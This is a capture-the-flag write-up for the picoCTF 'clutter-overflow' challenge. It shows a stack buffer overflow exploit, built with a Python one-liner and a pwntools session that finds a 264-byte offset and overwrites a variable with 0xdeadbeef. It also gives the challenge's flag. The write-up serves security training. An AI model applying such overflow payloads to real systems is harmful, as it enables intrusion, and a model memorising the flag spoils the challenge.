# clutter-overflow

## Objetivo

Clutter, clutter everywhere and not a byte to use.`nc mars.picoctf.net 31890`

## Hints

## Solución

```
┌──(kali㉿kali)-[~/Documents/PicoCTF/clutter-overflow]
└─$ (python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | ./chall ______________________________________________________________________ |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ | |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ / \^ ^ | |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \ ^ _ ^ / | | \^ ^| | ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | // | /_\ ^| | ____ ____ | | ^ | |^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^| | ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ | |^ ^ ^ ^ ^| / ( \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \|^ ^| .-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ | | |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\ |^ ^| | ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ | |'.____'_^||/!\@@@@@/!\|| _'______________.'|== ===== |\|______|===============|________________|/|"""""""""""""""""""""""""" " ||""""||"""""""""""""""||""""""""""""""||""""""""""""""""""""""""""""" ""''""""''"""""""""""""""''""""""""""""""''"""""""""""""""""""""""""""""" """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" My room is so cluttered... What do you see? code == 0xdeadbeef: how did that happen?? take a flag for your troubles cat: flag.txt: No such file or directory

┌──(kali㉿kali)-[~/Documents/PicoCTF/clutter-overflow]
└─$ (python3 -c 'import sys; sys.stdout.write("A" * 264)'; echo -e '\xef\xbe\xad\xde') | nc mars.picoctf.net 31890 ______________________________________________________________________ |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ | |^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^| | ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ / \^ ^ | |^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ / \ ^ _ ^ / | | \^ ^| | ^/_\^ ^ ^ /_________\^ ^ ^ /_\ | // | /_\ ^| | ____ ____ | | ^ | |^ =|= ^ =================^ ^=|=^| |^=|=^ | | {____}{____} | |^ ^| | ^ ^ ^ ^ | ========= |^ ^ ^ ^ ^\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ | |^ ^ ^ ^ ^| / ( \ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/ %%%%%%%%%%%%%% \|^ ^| .-----. ^ || ) ||^ ^.-------.-------.^| %%%%%%%%%%%%%%%% | ^ | | |^ ^|| o ) ( o || ^ | | | | /||||||||||||||||\ |^ ^| | ___ | ^ || | ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ | |'.____'_^||/!\@@@@@/!\|| _'______________.'|== ===== |\|______|===============|________________|/|"""""""""""""""""""""""""" " ||""""||"""""""""""""""||""""""""""""""||""""""""""""""""""""""""""""" ""''""""''"""""""""""""""''""""""""""""""''"""""""""""""""""""""""""""""" """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" My room is so cluttered... What do you see? code == 0xdeadbeef: how did that happen?? take a flag for your troubles picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

```
┌──(kali㉿kali)-[~/Documents/PicoCTF/clutter-overflow]
└─$ python3
Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> exe = ELF('./chall')
[*] '/home/kali/Documents/PicoCTF/clutter-overflow/chall'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
>>> io = process([exe.path])
[x] Starting local process '/home/kali/Documents/PicoCTF/clutter-overflow/chall'
[+] Starting local process '/home/kali/Documents/PicoCTF/clutter-overflow/chall': pid 169635
>>> pattern = cyclic(length=500, n=exe.bytes)
>>> pattern                                                                                                                                                            
b'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaaja                                                                                           aaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa                                                                                           aataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda                                                                                           aaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaa                                                                                           abnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwa                                                                                           aaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaa                                                                                           achaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaa'                                                                                                                        
>>> io.sendlineafter(b'What do you see?, pattern')                                                                                                                     
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
TypeError: tube.sendlineafter() missing 1 required positional argument: 'data'
>>> io.sendlineafter(b'What do you see?', pattern)
b' ______________________________________________________________________\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n|\'.____\'_^||/!\\@@@@@/!\\|| _\'______________.\'|==                    =====\n|\\|______|===============|________________|/|""""""""""""""""""""""""""\n" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  \n""\'\'""""\'\'"""""""""""""""\'\'""""""""""""""\'\'""""""""""""""""""""""""""""""\n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\nMy room is so cluttered...\nWhat do you see?'
>>> code = io.recvline_containsS('code == ')
/home/kali/.local/lib/python3.11/site-packages/pwnlib/tubes/tube.py:1408: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  return packing._decode(func(self, *a, **kw))
[*] Process '/home/kali/Documents/PicoCTF/clutter-overflow/chall' stopped with exit code -11 (SIGSEGV) (pid 169635)
>>> code
'code == 0x6261616161616169'
>>> code = code.partition('code == 0x')[2]
>>> code
'6261616161616169'
>>> code = int(code, base=16)
>>> code
7089054359331365225
>>> hex(code)
'0x6261616161616169'
>>> offset = cyclic_find(code, n=exe.bytes
... 
... 
KeyboardInterrupt
>>> offset = cyclic_find(code, n=exe.bytes)
>>> offset
264
>>> payload = fit({offset:0xdeadbeef})
>>> payload
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaac\xef\xbe\xad\xde'
>>> io = process([exe.path])
[x] Starting local process '/home/kali/Documents/PicoCTF/clutter-overflow/chall'
[+] Starting local process '/home/kali/Documents/PicoCTF/clutter-overflow/chall': pid 175868
>>> io.sendlineafter(b'What do you see?', payload)
b' ______________________________________________________________________\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |\n|^ ^ ^ ^ ^ ^ |L L L L|^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ ==================^ ^ ^|\n| ^ ^ ^ ^ ^ ^| L L L | ^ ^ ^ ^ ^ ^ ___ ^ ^ ^ ^ /                  \\^ ^ |\n|^ ^_^ ^ ^ ^ =========^ ^ ^ ^ _ ^ /   \\ ^ _ ^ / |                | \\^ ^|\n| ^/_\\^ ^ ^ /_________\\^ ^ ^ /_\\ | //  | /_\\ ^| |   ____  ____   | | ^ |\n|^ =|= ^ =================^ ^=|=^|     |^=|=^ | |  {____}{____}  | |^ ^|\n| ^ ^ ^ ^ |  =========  |^ ^ ^ ^ ^\\___/^ ^ ^ ^| |__%%%%%%%%%%%%__| | ^ |\n|^ ^ ^ ^ ^| /     (   \\ | ^ ^ ^ ^ ^ ^ ^ ^ ^ ^ |/  %%%%%%%%%%%%%%  \\|^ ^|\n.-----. ^ ||     )     ||^ ^.-------.-------.^|  %%%%%%%%%%%%%%%%  | ^ |\n|     |^ ^|| o  ) (  o || ^ |       |       | | /||||||||||||||||\\ |^ ^|\n| ___ | ^ || |  ( )) | ||^ ^| ______|_______|^| |||||||||||||||lc| | ^ |\n|\'.____\'_^||/!\\@@@@@/!\\|| _\'______________.\'|==                    =====\n|\\|______|===============|________________|/|""""""""""""""""""""""""""\n" ||""""||"""""""""""""""||""""""""""""""||"""""""""""""""""""""""""""""  \n""\'\'""""\'\'"""""""""""""""\'\'""""""""""""""\'\'""""""""""""""""""""""""""""""\n""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\n"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""\nMy room is so cluttered...\nWhat do you see?'
>>> print(io.recvline())
b'\n'
>>> print(io.recvline())
[*] Process '/home/kali/Documents/PicoCTF/clutter-overflow/chall' stopped with exit code 0 (pid 175868)
b'code == 0xdeadbeef: how did that happen??\n'
>>> print(io.recvline())
b'take a flag for your troubles\n'
>>> print(io.recvline())
b'cat: flag.txt: No such file or directory\n'
>>> print(io.recvline())
b'picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}\n'
```

## Flag

picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}

## Notas adicionales

## Referencias

